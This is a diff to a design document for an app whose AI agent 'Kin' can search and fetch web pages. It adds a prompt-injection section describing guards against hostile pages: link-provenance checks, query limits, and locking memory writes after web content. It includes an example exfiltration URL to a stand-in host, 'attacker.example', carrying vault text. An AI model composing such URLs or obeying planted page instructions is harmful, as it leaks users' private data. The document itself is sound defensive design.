@@ -316,8 +316,10 @@ providers), `crates/ingest/src/web/guard.rs` (the fetch guard); webview:
 `src/settings/Web.tsx`, `src/kin/WebSources.tsx`.
 
 While web tools are on (Settings › Web, on by default), every Kin turn
-(the chat, comment threads, helpers, the developer panel) gets two more core
-tools after `tool`:
+(the chat, comment threads, the developer panel) gets two more core tools
+after `tool`. Helpers (the daily Ideas batch and other background jobs) get
+them only while "Background helpers can use it" is on, which it isn't by
+default:
 
 | Tool | Does |
 | --- | --- |
@@ -361,10 +363,41 @@ next turn.
   `<data tool="web_fetch">` like any tool's. The prompt tells Kin that web
   pages are strangers' claims, never instructions; to read a page before
   relying on it and give its URL; and to keep private details from the
-  vault out of queries.
+  vault out of queries. The guards below don't rely on Kin following it.
 - **Privacy.** Every query leaves the Mac for the search provider he picked,
   under his own account. Pages Kin reads are fetched from this Mac. Settings
   › Privacy says both.
+
+### Prompt injection (KI-81)
+
+Code: `ai/web/guard.rs`, one `Guard` per turn's `Web`. A page or a search
+snippet can tell Kin to do things. The prompt says not to; these rules
+hold even when Kin does as told:
+
+- **Links need provenance.** `web_fetch` opens a URL only if it appeared in
+  Hussain's own messages (this one and the earlier ones the turn carries,
+  bare `example.com/post` included), in what Kin read from the vault or the
+  Feed this turn (`search`, `read`, `list` and the vault and Feed extras;
+  not `history`, `idea` or spilled outputs, since Kin's own words may carry
+  a planted link), or in this turn's search results; or it's a link on a
+  page fetched this turn, on the same host (`www.` aside) and without a
+  query string. URLs compare without scheme, `www.`, fragment or trailing
+  slash. Anything else is refused before a request is made, and Kin is told
+  to say "I can only open links you gave me or that came up in a search".
+  So a URL Kin composes (`https://attacker.example/?q=<vault text>`) never
+  leaves the Mac. Pages already fetched this turn can be paged through.
+- **Queries.** At most 200 characters, and no run of 8 words in a row
+  (lowercased, punctuation ignored) from what Kin read in the vault this
+  turn, unless Hussain wrote those words in his messages. Refused queries
+  are never sent.
+- **Memory locks after the web.** Once a `web_search` or `web_fetch` has
+  brought text into the turn, `memory` and skill writes and deletes are
+  refused for the rest of it, with a message saying Hussain can ask Kin to
+  remember it in his next message. Reading skills still works. A refused
+  web call brings no text, so it doesn't lock anything.
+- **Helpers.** Unattended helper jobs get no web tools unless Settings ›
+  Web allows it (`web.json` `helpers`, off by default). A helper's brief
+  counts as its "message".
 
 ### Sources in the chat
 
@@ -392,8 +425,8 @@ a globe.
 ### Headless
 
 With `KINTSUGI_HEADLESS_KIN=mock`, the web tools are scripted: three
-results for any query and a short page for any URL, with no key and nothing
-sent. Asked about "the web" or "online", the scripted model searches, reads
+results for any query and a short page for any URL that passes the guard,
+with no key and nothing sent. Asked about "the web" or "online", the scripted model searches, reads
 the first result, then answers. `test/runtime-kin.test.ts` drives it.
 
 ## Context
